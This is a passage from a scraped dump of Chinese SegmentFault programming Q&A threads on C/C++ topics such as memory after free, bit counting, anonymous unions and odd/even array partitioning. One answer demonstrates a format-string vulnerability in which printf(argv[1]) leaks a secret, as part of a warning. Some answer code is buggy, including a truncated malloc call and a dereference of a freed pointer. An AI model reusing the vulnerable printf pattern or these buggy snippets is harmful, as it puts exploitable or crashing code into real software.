      "answer1": "<div class=\"answer fmt\" data-id=\"1020000005746733\">\n<p>用链表还是很容易的吧，只是改变指针就可以了，遍历一次搞定，遇到偶数插入队尾（只改指针不申请内存），奇数就不管它，但如果还要对奇偶数各自排序基本不会有O(n)的算法</p>\n<pre><code>L = [1, 2, 3, 4, 5, 6]\nindex = 0\nfor _ in range(len(L)):\n    if L[index] % 2 == 1:\n        index += 1\n    else:\n        L.append(L.pop(index))\nprint(L)</code></pre>\n<pre><code>#include &lt;iostream&gt;\n#include &lt;list&gt; \n\nusing namespace std;\n\nint main() {\n    list&lt;int&gt; L;\n    int n = 3; \n    // 初始化链表\n    for(int i = 1; i &lt;= n * 2; i++)\n        L.push_back(i);\n    // 划分奇偶数\n    for(list&lt;int&gt;::iterator it = L.begin(); 0 &lt; n; ++it){\n        if(*it % 2 == 0){  // 如果是偶数\n            L.push_back(*it); // 插入尾节点 O(1)\n            L.erase(it); // 删除节点 O(1)\n            n -= 1;\n        }      \n    }\n    // 打印链表\n    for(list&lt;int&gt;::iterator it = L.begin(); it != L.end(); ++it)\n        cout &lt;&lt; *it &lt;&lt; ' ';\n    cout &lt;&lt; endl;\n        \n    return 0;\n}</code></pre>\n<p>已经很多人说了， 用链表是很容易实现的，但是用数组却不行（保持稳定性，时间O(n)，空间O(1)），如果谁可以，show your code，让我们膜拜你。</p>\n<p>初看无解的问题，貌似也有解决的办法的，待我整理一下。</p>\n<pre><code>def Foo(L):\n    # L = [0, 2, 4, 1, 3, 5]\n    length = len(L)\n    sk = max(*L, length) + 1# secret key\n    # 32位的话最多是支持4万多的数据量，且最大值也不超过46340\n    assert sk &lt; 46340, 'sk must be less than 46340' \n    li = 0                  # left index\n    ri = length - 1         # right index\n    uli = li                # unsorted left index\n    uri = ri                # unsorted right index\n    lli = length // 2 - 1   # left last index\n    rfi = lli + 1           # right first index\n    # 第一个循环先区别就位和未能就位的元素，同时将index信息加密到未能就位的元素数据中\n    # 这里用的加密文法是number = -(num + sk * indnx),将其变成一个负值\n    # 解密可以用index, num = divmod(abs(number), sk)来解密\n    while li &lt;= ri:\n        # 左边扫描到奇数\n        if L[li] % 2 == 1:\n            L[li], L[uli] = L[uli], L[li]\n            li += 1\n            uli += 1\n        # 右边扫描到偶数\n        elif L[ri] % 2 == 0:\n            L[ri], L[uri] = L[uri], L[ri]\n            ri -= 1\n            uri -= 1\n        # 当左为偶，且右为奇\n        else:\n            L[li], L[ri] = L[ri], L[li]\n            L[li] = -(L[li] + sk * lli) # 加密乱序的元素\n            lli -= 1\n            L[ri] = -(L[ri] + sk * rfi) # 加密乱序的元素\n            rfi += 1\n            li += 1\n            ri -= 1\n    print(L) # 加密后 [-39, -20, -1, -89, -70, -51]\n    # 解密\n    for i in range(uli, uri):\n        if L[i] &lt; 0:\n            index, number = divmod(abs(L[i]), sk)\n            next_num = L[index]\n            while next_num &lt; 0:                \n                L[index] = number\n                index, number = divmod(abs(next_num), sk)\n                next_num = L[index]\n    print(L) # 解密 [1, 3, 5, 0, 2, 4]\n    return L</code></pre>\n<p><strong>最好不要用大于length数字来测试</strong>，如果数据不大的话，应该没问题的，否则就要考虑溢出的问题了。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000005745919\">\n<p>我是這樣想拉，不知道你覺得怎麼樣:</p>\n<p>就從數組的頭開始走，碰到奇數不動，碰到偶數就把它放到數組的最後，直到搬動了 n 個偶數為止。</p>\n<pre><code>1. 奇數偶數各自順序不變\n2. 只需要一個整數記目前搬動幾個了\n3. 就最差 2n 步(偶數都在後面的情況)</code></pre>\n<hr>\n<p>P.S. 為什麼給負分呢? 如果覺得答案有任何不妥的地方，可以先評論、討論之後再給別人負分，我不覺得有必要踩在這裡認真討論的人，對於負分充滿著疑惑...</p>\n</hr></div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000005746481\">\n<p>在你的3个条件限制下，数组不行，链表可以。</p>\n</div>",
      "attention": "28",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000005744068\">\n<p>给定一个2n长数组，其中n个奇数和n个偶数，对数组进行排序将奇数放在前半部分，偶数放在后半部分。要求：</p>\n<ol>\n<li><p>不改变原来的奇偶各自的相对顺序</p></li>\n<li><p>只申请常数的空间</p></li>\n<li><p>时间复杂度为O(n)</p></li>\n</ol>\n<p>举例：给出1 2 3 4 5 6<br>排序后为 1 3 5 2 4 6</br></p>\n<p>PS：请一定仔细阅读3个条件，去掉其中任意一个都变得简单，并且网上我搜到的答案都是缺少其中某个条件的。因此我怀疑这题是否有解。</p>\n<hr>\n<p>看了大家的回答，基本可以分为2种情况：</p>\n<ol>\n<li><p>用链表可以轻易解决这道题，当然如果把数组转成链表因为需要申请2n长度的next数组，所以认为还是申请额外空间了</p></li>\n<li><p>只管输出，如果只要求输出结果那遍历2遍就行了，但这样题目变得太过简单</p></li>\n</ol>\n<p>因为这是一道面试题，我想可以从上面2方面和面试官沟通，我只是凭记忆写下这题，其中也许有自己的一些思维定势（比如没有强调一定是数组，或者没有强调必须要求数组排序只要求输出）。看了大家的讨论还是很有启发的。</p>\n<hr>\n<p>找到了国外的链接，看了一圈讨论大部分认为没有O(n)时间O(1)空间的解法<br><a href=\"https://www.careercup.com/question?id=5201559730257920\">https://www.careercup.com/question?id=5201559730257920</a></br></p>\n<hr>\n<p>另外说下我自己对这题的一个思考，可以观察到，假如一个数组是符合最终条件的，那么发现当且仅当只交换相邻的两个奇偶数是不会破坏相对顺序的，那么只需给出一个策略找出从最终状态转到题目起始状态的就行了。<br>另外，不要纠结于奇偶分别的大小问题，比如4 5 3 1 2 6和2 1 3 5 4 6是等价的，只是一个简单的替换，只要将奇数按1 3 5……这样的顺序，偶数按2 4 6……这样的顺序排好就行了。</br></p>\n</hr></hr></hr></div>",
      "favourite": "7",
      "glance": "1.4k",
      "tags": [
        "c++",
        "c",
        "python",
        "算法"
      ],
      "time": "6-17",
      "title": "给定一个2n长的数组将奇数放在偶数前面",
      "url": "https://segmentfault.com/q/1010000005744068"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000303372\">\n<p>其实就是简单的位运算啊，给你写个更好理解的</p>\n<pre><code class=\"lang-c\">#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(void)\n{\n    int n, count;\n\n    while (scanf(\"%d\", &amp;n) != EOF) {\n        count = 0;\n        while (n) {\n            if (n &amp; 1)  count ++;\n            n &gt;&gt;= 1;\n        }\n        printf(\"%d\\n\", count);\n    }\n\n    return 0;\n}\n</code></pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000269121\">\n<p>百度了一下这里讲的不少<a href=\"http://wenku.baidu.com/view/7e127d563c1ec5da50e2701d.html\" rel=\"nofollow\">百度文库</a>，你贴出来的这一段代码“v &amp;= (v-1);”这一句效果很明显的，二进制的数多用位操作。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000269128\">\n<p>算法里面<strong><em>v &amp;= (v-1);</em></strong>这一句的含义就是将二进制中最右边的一个1去掉<br/>\n去掉一次<strong><em>num</em></strong>增加1  </p>\n<p>比如：<br/>\nv=13 二进制1101<br/>\nv-1=12 二进制1100<br/>\n相与结果为 1100<br/>\nv-1=11 二进制 1011<br/>\n相与结果为 1000<br/>\nv-1=7  二进制 0111<br/>\n相与结果为 0000<br/>\n就退出循环 </p>\n<p>每次相与后都是去掉最右边的一个1</p>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000269106\">\n<p>编程之美中的一道题,有一个解法想不明白\n该算法只考虑1的个数\n代码如下:</p>\n<pre><code>int Count(BYTE v)\n{\n    int num = 0;\n    while(v)\n    {\n        v &amp;= (v-1);\n        num++;\n    }\n    return num;\n}\n</code></pre>\n<p>在网上看了一下都只是把算法给出来都没有解释,哪位同学帮忙解释一下,想不明白.多谢</p>\n</div>",
      "favourite": "5",
      "glance": "2.6k",
      "tags": [
        "编程",
        "c"
      ],
      "time": "2013-08-27",
      "title": "求二进制数中1的个数",
      "url": "https://segmentfault.com/q/1010000000269106"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000327184\">\n<p>下面的代码中</p>\n<pre><code>for (pos = hlist_bl_first_rcu(head);\n    pos &amp;&amp;\n    ({ tpos = hlist_bl_entry(pos, typeof(*tpos), member); 1; });\n    pos = rcu_dereference_raw(pos-&gt;next))  \n{  \n...  \n}\n</code></pre>\n<p>第3行 <code>({ tpos = hlist\\_bl\\_entry(pos, typeof(\\*tpos), member); 1; })</code> 的意思是执行函数 <code>hlist\\_bl\\_entry()</code> 后再将这个括号的值设置为 <code>1</code>，就是这个 <code>for</code> 循环只通过 <code>pos</code> 的值来判断是否继续执行。</p>\n<p>现在不太清楚这一行的语法，为什么可以这么写，求解释。</p>\n</div>",
      "favourite": "5",
      "glance": "1.7k",
      "tags": [
        "c"
      ],
      "time": "2013-10-30",
      "title": "对一行C代码的语法不明白，求解释",
      "url": "https://segmentfault.com/q/1010000000327184"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000004936735\">\n<p>你可以理解你复制的东西是一个Object，具体粘贴成什么样子，就看目标软件从你的Object当中获取了哪些内容</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000004937660\">\n<p>本质上应该是二进制吧<br>在windows上，可以通过调用不同的的方法，直接取出音频，图像或文本对象<br>网页的话，取出的应该都是string</br></br></p>\n<p>如果用的是.net,可以用 System.Windows.Clipboard 这个类<br>复制的是网页时，Clipboard.GetText(TextDataFormat.Html)应该就能取出html字符串<br>具体参考MSDN: <a href=\"https://msdn.microsoft.com/zh-cn/library/system.windows.clipboard(v=vs.110).aspx\">https://msdn.microsoft.com/zh-cn/library...</a></br></br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000004945681\">\n<html><body>\n<p><img data-src=\"/img/bVuUK0\"/></p>\n<p>网页的HTML吧,Notepad++有粘贴为html的选项</p>\n</body></html>\n</div>",
      "attention": "13",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000004934818\">\n<html><body>\n<p>不好意思,我也不知道这个问题去哪个栏目问,该在那个编程语言板块,我就都问问吧,总有懂的人!</p>\n<p>就是比如我复制一个网页的内容,其中有文本,也有图片,</p>\n<p>要是把他粘贴到一个*.txt里,他就粘贴出来是一个纯字符串;</p>\n<p>要是把他粘贴到一个word文档里,他就是包含html 标签和 css 样式的一段排好版的文字;</p>\n<p>要是把他粘贴到 QQ聊天窗口,就是 图片 + 字符串,</p>\n<p>我就不明白我剪切板里到底是个什么东西?</p>\n<p>这个东西是用什么编码的?</p>\n<p>其实为问这个的目的,就是想重新编码剪切板..</p>\n<p><img data-src=\"/img/bVuRWg\"><br><img data-src=\"/img/bVuRWh\"><br><img data-src=\"/img/bVuRWk\"/></br></img></br></img></p>\n</body></html>\n</div>",
      "favourite": "1",
      "glance": "1k",
      "tags": [
        "c",
        "c++",
        "vb.net",
        "javascript",
        "php"
      ],
      "time": "4-14",
      "title": "当你复制一个网页的时候,你的剪切板里是什么呢?",
      "url": "https://segmentfault.com/q/1010000004934818"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000117303\">\n<p>有如下一段代码，为何在外部可以访问ev_ncalls而不需要经过_ev和ev_signal两层封装呢？<br/>\nevent的结构如下</p><pre>struct event {\n\tunion {\n\t\t/* used for io events */\n\t\tstruct {\n\t\t\tTAILQ_ENTRY(event) ev_io_next;\n\t\t\tstruct timeval ev_timeout;\n\t\t} ev_io;\n\n\t\t/* used by signal events */\n\t\tstruct {\n\t\t\tTAILQ_ENTRY(event) ev_signal_next;\n\t\t\tshort ev_ncalls;\n\t\t\t/* Allows deletes in callback */\n\t\t\tshort *ev_pncalls;\n\t\t} ev_signal;\n\t} _ev;\n\n};</pre><p>struct event *ev;<br/>\nint ncall = ev-&gt;ev_ncalls;</p>\n</div>",
      "favourite": "2",
      "glance": "1.4k",
      "tags": [
        "c"
      ],
      "time": "2012-09-09",
      "title": "关于获取一个union的内部字段",
      "url": "https://segmentfault.com/q/1010000000117303"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000201879\">\n<p>前端如何快速深入学习？\n有必要看对html和js,css的处理代码来深入吗？\n有没有比较简易的这方面的开源代码？或者有没有对dom如何处理的分析资料？\n什么是前端开发比较核心的技术？</p>\n<p>后端开发如何深入学习？\n那些是比较核心的概念和技术？</p>\n</div>",
      "favourite": "2",
      "glance": "2.5k",
      "tags": [
        "c",
        "编程",
        "程序员"
      ],
      "time": "2013-05-17",
      "title": "如何快速深入学习web开发？",
      "url": "https://segmentfault.com/q/1010000000201879"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000253865\">\n<p>十几年前上学的时候，计算机还是紧缺资源，在没有购买个人电脑之前，我们通常会去学校的计算机室上机。计算机室有专人管理，规矩诸多，其中包括“不要随意修改系统配置文件”，“不要做和学习无关的事情”等等。而我们经常会很开心地先把autoexec.bat/config.sys大改一气（很没出息是吧，不久几十K字节的事儿么，:))，然后再往机器上拷贝个金庸群侠传之类的，偷偷玩上半个小时。第二天再去上机的时候，直奔昨天保存文件的目录。运气好的时候，文件还在，于是大喜，接着进度继续玩；运气不好的时候，不但文件已经被删，而且还发现机器上新增的病毒好厉害，-&gt;_-&gt;。</p>\n<p>说这个陈芝麻烂谷子，也许你已经明白我的意思。<br/>\n其实我想说的就是两点：<br/>\n1. 你可以不遵守规则，但不等于没有规则。<br/>\n2. 不遵守规则而产生的后果是不可预测的(undefined)。</p>\n<p>楼主没有明确说明为什么会认为free的内存仍然可用，以及为什么认为局部变量的数据仍然可用。<br/>\n为了说明问题，我假设以下的程序：</p>\n<pre><code>#include&lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint *lvret(void) {\n    int ret = 5;\n    return &amp;ret;\n}\n\nint main(void) {\n    int *p = lvret();\n    printf(\"%d\\n\",*p);\n}    \n</code></pre>\n<p>编译运行这个程序的结果很可能是5。<br/>\n所以函数结束后，局部变量的数据仍然可用是吗？</p>\n<p>再来考虑下面这个程序：</p>\n<pre><code>#include&lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint *lvret(void) {\n    int ret = 5;\n    return &amp;ret;\n}\n\nvoid mod(void) {\n    int a = 7;\n}\n\nint main(void) {\n    int *p = lvret();\n    mod();\n    printf(\"%d\\n\",*p);\n}\n</code></pre>\n<p>这个程序运行的结果很可能是7。<br/>\n显然，这个内存地址现在变得不那么可靠了。</p>\n<p>(<em>编译器还是会给出警告，比如gcc 4.8</em>）</p>\n<blockquote>\n<p>warning: function returns address of local variable [-Wreturn-local-addr]\n       return &amp;ret;</p>\n</blockquote>\n<p>所以这个例子告诉我们，你能够访问到的内存空间并不总是安全的。<br/>\n换句话说，你发现释放后的内存数据或者局部变量占用的内存仍然可以读写，只不过是偶然的情况 -- 刚好没有被别的程序动过而已。</p>\n<p>C语言并不是一个内存安全的语言。<br/>\nC++也不是，但C++11已经好很多了(接纳了smart pointer)。  </p>\n<p><strong>补充</strong></p>\n<p>以上主要说明楼主描述的操作为什么从根本上是需要避免的。<br/>\n再来补充回答一下楼主的疑问：</p>\n<p>问题1：<br/>\n是Heap(堆)的管理。<br/>\n楼主的潜台词应该是“既然内存释放了，那么在访问的时候为什么不出现<code>segmentation fault</code>”。\n回答是 -- 这是C运行库实施层面的问题。大多数运行库的实施不会试图去识别那些已经被\"free\"的内存块，并把它们退回系统(所谓退回系统，就是取消在进程地址空间上的映射)。因此，在访问这些地址的时候，<code>segmentation fault</code>没有如预料中出现。\n但并不全是这样，也有例外，比如说OpenBSD就是一个。访问<a href=\"http://en.wikipedia.org/wiki/Malloc#OpenBSD.27s_malloc\" rel=\"nofollow\">wiki</a>，你可以看到如下描述：</p>\n<blockquote>\n<p>On a call to free, memory is released and unmapped from the process address space using munmap. This system is designed to improve security by taking advantage of the address space layout randomization and gap page features implemented as part of OpenBSD's mmap system call, and to detect use-after-free bugs—as a large memory allocation is completely unmapped after it is freed, further use causes a segmentation fault and termination of the program.</p>\n</blockquote>\n<p>这也从侧面证明了楼主观察到的现象是不可靠的。<br/>\n(至于为什么多数运行库要采取这样的内存管理策略，又是另一个话题了)</p>\n<p>问题2：<br/>\n是Stack(栈)的管理。<br/>\n@精英王子 已经说明了。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000259512\">\n<p>内存管理有以下几个层次（从高到低）：C程序 - C库（malloc）- 操作系统 - 物理内存</p>\n<p>首先，操作系统保证每个进程都有独立的虚拟内存空间（32bit上应该是4G吧，一般进程也用不了这么多）。当然实际上物理内存是所有进程共享的，所以当你需要动态内存时，需要向操作系统申请，这时候虽然从你程序的角度，内存是连续的，其实是被操作系统映射到某一块物理内存而已。程序用完内存归还后，实际归还的部分可能被操作系统分配给其他进程。</p>\n<p>要注意，上面说的“归还”是malloc库的行为。malloc库会使用一些策略来提高内存使用的效率，比如程序需要使用10K内存时，malloc实际<em>可能</em>上会申请1M，因为一次系统调用开销很大；再比如即使你调用了<code>free</code>“归还“了程序使用的内存，malloc库也<em>可能</em>并未真正把这些内存归还给操作系统，因为将来程序可能还会再申请动态内存。</p>\n<p>malloc库有多种实现，我知道的一种是使用标记（tag）来存储内存的元信息。比如你申请了8个byte，得到的头指针地址是0x1001（实际内存为0x1001-0x1008），malloc会在0x1000（也就是头指针-1的位置）保存8，即这段内存的长度。等释放时，程序将头指针地址传给<code>free</code>，malloc库从头指针-1的位置发现需要释放的内存长度，释放内存（实际的操作可能只是将tag清空）。这就解释了：1. 为什么和<code>malloc</code>不同，<code>free</code>的参数只有一个头指针而不需要长度；2. <code>free</code>后内存实际上可能并未归还给操作系统。</p>\n<p>所以，访问被（程序）释放的内存是一种undefined行为，就是说结果是不确定的。在malloc库未将此内存归还给操作系统也未进行下一次动态分配时，这块内存事实上仍属于程序。而当malloc库不清理归还的内存时（多数实现都是如此），你能访问到的值仍是原来的值。这和函数调用完毕而未清理栈帧、后续调用函数可以访问到之前已经设置的局部变量值是一个道理。</p>\n<p>但是，当malloc库已经将内存归还给系统时，再去访问原来的地址（更别说写），由于这段地址已经不属于程序了，就会出现经典的segmentation fault。</p>\n<p>说到底，这些现象还是C语言库为了更有效率的实现而妥协的结果。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000253803\">\n<p>这是一个很复杂的问题，我谈谈自己的理解。</p>\n<p>首先你需要知道，进程使用的都是虚拟地址空间，每个进程都有独立的，完整的4GB(32bit下)地址空间，未必每一块内存都会映射到物理内存，这个映射工作是操作系统完成的。如果你访问了地址空间里未映射的内存，或者写了只读的区域，操作系统就会报错(Segment Fault错误，呵呵~)并终止你的程序。</p>\n<p>当一个进程开始运行时，会向操作系统申请一块“堆”内存，由程序自己对这块堆内存进行管理，malloc就是从这块内存中分配内存，在C语言中，这个申请和管理堆内存的工作是由运行库自动完成的。</p>\n<p>当free一块内存后，free(即运行库)会将这块内存标记为未使用，下次有可能会将这块内存分配出去。但这块内存对进程来说仍然是可以读写的，因为运行库已经向操作系统申请，自己来管理这块内存了。</p>\n<hr/>\n<p>局部变量是分配在栈上的，进程开始运行时，操作系统会分配给进程一块固定大小(通常是1MB)的栈，所谓分配和释放局部变量，都只是在移动栈顶指针而已，只要没超过栈的这1MB内存区域，都还是可以读写的。</p>\n<p>以上都是常见操作系统的典型行为，也许在某些操作系统和平台上并非这么工作，总之，使用已释放的内存是非常危险的行为。</p>\n<hr/>\n<p>有兴趣可以读这两本书《深入理解计算机系统》《链接装载与库》</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000253786\">\n<p>1.free 一段内存后，为什么还可以对这段内存进行读写。。。按照网上以及书上的说法，释放内存后，这段内存就不应该使用了，操作系统就可以分配给其他任务。。</p>\n<p>我的疑问是，释放内存后，这段内存资源还是否属于当前进程？？？</p>\n<p>如果属于当前进程，那么读写访问无可厚非。</p>\n<p>可是，操作系统可以再次利用这段内存并分配给其他人,那么这里的 “其他”只是限定在当前进程中吗，只是给当前进程其他代码中的内存申请来使用么？</p>\n<p>2.局部的数组，在函数运行完毕后，应该释放，但是为什么依然可以读写其中的数据  ？</p>\n</div>",
      "favourite": "18",
      "glance": "11.7k",
      "tags": [
        "c",
        "c++"
      ],
      "time": "2013-07-13",
      "title": "free释放内存后，内存空间的疑问",
      "url": "https://segmentfault.com/q/1010000000253786"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000270566\">\n<p>娘的……答案评论里不支持贴代码，那我就另外加一个答案吧。对于最佳答案的一些评论</p>\n<ol>\n<li>printf 的原型是</li>\n</ol>\n<pre><code class=\"lang-c\">int printf ( const char * format, ... );\n</code></pre>\n<p>因此，<code>printf(str)</code> 是可行的。</p>\n<p>但是，如果 <code>str</code> 是用户输入的内容或外部获得的内容，<code>str</code> 中就可能含有恶意代码，可以用来进行内存溢出进而执行任意代码的攻击。因此，这样做应该是严格禁止的。—— Biergaizi</p>\n<ol>\n<li>c/c++对于申请的内存空间进行初始化是一个好习惯，所以做一个memset或者是把第一个单元初始化为零是值得鼓励的做法</li>\n<li>另外像楼上说的，malloc的内存要记得free，否则一会就没有内存可以用了。同时记得free之后把指针清零。避免代码过长之后，错误调用这个已经free的指针</li>\n<li>c中的字符串是必须以0结尾的。这里你用的strcpy在复制字符串的时候帮你做了这件事情。但是你要心里有数。</li>\n<li>你的GetMemory可以直接返回一个指针，就免去传递指针的指针这个问题了</li>\n</ol>\n<pre><code class=\"lang-c\">char* GetMemory()\n{\n   char* p = (char *)malloc(100);\n   memset(p, 0, SIZE); // or *p = 0;\n   return p;\n}\n</code></pre>\n<p>以下下代码在win7上编译，运行通过</p>\n<pre><code class=\"lang-c\">#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#define SIZE 100\nvoid GetMemory(char **p)\n{\n   *p = (char *)malloc(\n   memset(*p, 0, SIZE); // or **p = 0;\n}\n\nvoid Test(void) \n{\n    char *str = NULL;\n    GetMemory(&amp;str);   \n    strcpy(str, \"hello world\");\n    printf(str);\n    free( str);\n    str = NULL;\n}\n\nint main(void)\n{\n    Test();\n    return 0;\n}\n</code></pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000303380\">\n<p>最简单的回答就是楼主没有搞清楚：\n引用传递和值传递</p>\n<p>想要修改str指向的内容，你得把指向str的指针传过去</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000270062\">\n<p>提问者似乎不太了解 C 语言，建议阅读《K &amp; R》等基础教程。</p>\n<h1>变量赋值错误（崩溃原因）</h1>\n<p>你试图通过 <code>GetMemory()</code> 把 <code>*str</code> 指向一段 <code>malloc()</code> 分配的内存。</p>\n<p>但是，C 语言的函数传参是按值传参，<code>*str</code> 的值 <code>NULL</code> 被拷贝到 <code>*p</code>，随后 <code>*p</code> 被指向 <code>malloc()</code> 返回的值，此时 <code>GetMomory()</code> 函数结束。<code>*str</code> 的值仍然为 <code>NULL</code>，没有任何变化。之后，你使用 <code>strcpy</code> 企图把 <code>\"hello world\"</code> 复制到 <code>NULL</code>，当然出错。</p>\n<p>正确的做法是，传递指针变量 <code>*str</code> 的地址给 <code>GetMemory(char **p)</code>。<code>*str</code> 本身就是一个指针，指向一个地址。<code>*str</code> 虽然是指针，但指针也有自己的地址，把 <code>*str</code> 的地址传给 <code>**p</code>，<code>**p</code> 便是一个指向指针的指针。</p>\n<p><strong>到此为止，你的主要问题已经解决。可以跳过剩余部分直接看代码</strong>。</p>\n<h1>遗漏 <code>free()</code>\n</h1>\n<p>程序退出后，操作系统会自动释放所有内存。但是，使用完内存后立刻释放永远没错。</p>\n<h1>\n<code>printf()</code> 用法错误</h1>\n<p>另外，你的 <code>printf()</code> 用法错误。<code>printf()</code> 的参数不能直接是要打印的数据。而需要一个带转换说明符的<strong>字面字符串</strong>，后面的参数是要格式化的实参。</p>\n<p>有人说按照 <code>printf()</code> 的原型，直接跟一个字符串 <code>printf(str)</code> 也是没有问题的。然而，<code>str</code> 如果是从外部获得的内容，如用户输入的，会导致严重的安全问题。GCC 和 Clang 会对这样的用法都会产生警告。</p>\n<p>比如说，在老旧的 32 位 Linux 上：</p>\n<pre><code class=\"lang-c\">#include &lt;stdio.h&gt;\n\nint main(int argc, char **argv)\n{\n    char *secret = \"This is a secret!\\n\";\n    printf(argv[1]);\n    return 0;\n}\n</code></pre>\n<p>如果使用 <code>-mpreferred-stack-boundary=2</code> 编译</p>\n<pre><code>$ gcc -mpreferred-stack-boundary=2 FormatString.c -o FormatString\n$ ./FormatString %s\nThis is a secret!\n</code></pre>\n<p>哦？这是为什么？我对底层了解不多，只能说这和 <code>varargs</code> 的内存越界有关，而 <code>*secret</code> 正好在这个内存地址上。有没有联想到 OpenSSL 前些时间曝光了“心脏出血”漏洞？</p>\n<p><code>-mpreferred-stack-boundary=2</code> 并非攻击的必要手段。只要条件适宜，经过周密计算，危害可能比这大得多。</p>\n<p>因此这样的用法必须禁止，应使用</p>\n<pre><code>printf(\"%s\\n\", str);\n</code></pre>\n<p>或</p>\n<pre><code>puts(str);\n</code></pre>\n<h1>没有 <code>#include</code> 任何头文件</h1>\n<p>使用库函数前需要 <code>#include</code> 提供相应函数的头文件。</p>\n<ul>\n<li>\n<code>printf()</code> 由 <code>stdio.h</code> 提供</li>\n<li>\n<code>malloc()</code> 由 <code>stdlib.h</code> 提供</li>\n<li>\n<code>strcpy()</code> 由 <code>string.h</code> 提供</li>\n</ul>\n<h1>没有 <code>main()</code> 函数</h1>\n<p><code>main()</code> 函数是程序的入口，没有入口，程序从何处执行？</p>\n<hr>\n<p>更正后的程序如下。</p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nvoid GetMemory(char **p)\n{\n    *p = (char *)malloc(100);\n}\n\nvoid Test(void) \n{\n    char *str = NULL;\n    GetMemory(&amp;str);   \n    strcpy(str, \"hello world\");\n    printf(\"%s\\n\", str);\n\n    free(str);\n    *str = NULL; // 避免误用已悬空的指针\n}\n\nint main(void)\n{\n    Test();\n    return 0;\n}\n</code></pre>\n</hr></div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000270048\">\n<pre><code class=\"lang-c\">void GetMemory(char *p)\n{\n    p = (char *)malloc(100);\n}\nvoid Test(void) \n{\n    char *str = NULL;\n    GetMemory(str);   \n    strcpy(str, \"hello world\");\n    printf(str);\n}\n</code></pre>\n</div>",
      "favourite": "1",
      "glance": "3.2k",
      "tags": [
        "c++",
        "c"
      ],
      "time": "2013-08-28",
      "title": "为什么这个程序会崩溃",
      "url": "https://segmentfault.com/q/1010000000270048"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000371775\">\n<p>今天才发现有这种用法<a href=\"http://gcc.gnu.org/onlinedocs/gcc/Unnamed-Fields.html#Unnamed-Fields\" rel=\"nofollow\">参考此处</a>。<br/>\n比如定义如下结构体:</p>\n<pre><code>struct Object {\n    enum ObjectType type;\n    union{\n      int value;\n      struct{\n         struct Object *header;\n         struct Object *tail;\n      };\n    };\n};  \n</code></pre>\n<p>可以这样访问结构成员:<br/>\nObject obj;<br/>\nobj.value = ..;<br/>\nobj.header = ..;<br/>\nobj.tail = ...;</p>\n<p>想请教下，这样定义匿名的字段有什么好处？</p>\n</div>",
      "favourite": "1",
      "glance": "3k",
      "tags": [
        "c"
      ],
      "time": "2013-12-28",
      "title": "c 语言中，在struct和union中使用未命名的字段有什么好处？",
      "url": "https://segmentfault.com/q/1010000000371775"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000439078\">\n<p>这里有两份代码，都是读1.dat的内容<strong>同步写</strong>到2.dat。<br>\n1.dat的内容是1亿个1，大小95.37MB。<br>\n另:<strong>延迟写</strong>的速度大概是2s</br></br></p>\n<p><strong>1.利用fcntl函数</strong></p>\n<pre><code>#include \"apue.h\"\n#include &lt;fcntl.h&gt;\n#define BUFFSIZE 4096\n\nvoid set_fl(int fd, int flags);\n\nint main()\n{\n    int     n;\n    char    buf[BUFFSIZE];\n    set_fl(STDOUT_FILENO, O_SYNC);\n    while ((n = read(STDIN_FILENO, buf, BUFFSIZE)) &gt; 0)\n        if (write(STDOUT_FILENO, buf, n) != n)\n            err_sys(\"write error\");\n\n    if (n &lt; 0)\n        err_sys(\"read error\");\n    exit(0);\n}\n\nvoid set_fl(int fd, int flags)\n{\n    int val;\n\n    if (val = fcntl(fd, F_GETFL, 0) &lt; 0)\n        err_sys(\"fcntl F_GETFL error\");\n\n    val |= flags;\n\n    if (fcntl(fd, F_SETFL, val) &lt; 0)\n        err_sys(\"fcntl F_SETFL error\");\n}\n\n./a.out &lt; 1.dat &gt;2.dat\nreal    0m3.080s\nuser    0m0.002s\nsys     0m0.174s\n</code></pre>\n<p><strong>2.使用O_SYNC打开文件2.dat</strong></p>\n<pre><code>#include \"apue.h\"\n#include &lt;fcntl.h&gt;\n#define BUFFSIZE 4096\n\n\nint main()\n{\n    int     n;\n    char    buf[BUFFSIZE];\n    int fd = open(\"2.dat\",O_WRONLY|O_SYNC);\n    while ((n = read(STDIN_FILENO, buf, BUFFSIZE)) 